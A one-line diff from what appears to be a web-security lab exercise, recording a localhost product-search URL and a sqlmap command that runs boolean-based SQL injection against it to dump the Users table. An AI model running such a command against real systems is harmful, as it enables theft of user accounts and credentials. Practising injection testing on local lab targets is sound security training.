@@ -1,0 +1,1 @@
+http://localhost:3000/rest/products/search?q=* (GET)  # labs/lab5/sqlmap-tool/sqlmap.py -u http://localhost:3000/rest/products/search?q=* --dbms=sqlite --batch --technique=B --threads=5 --output-dir=labs/lab5/sqlmap -T Users --dump --answers=crack=N
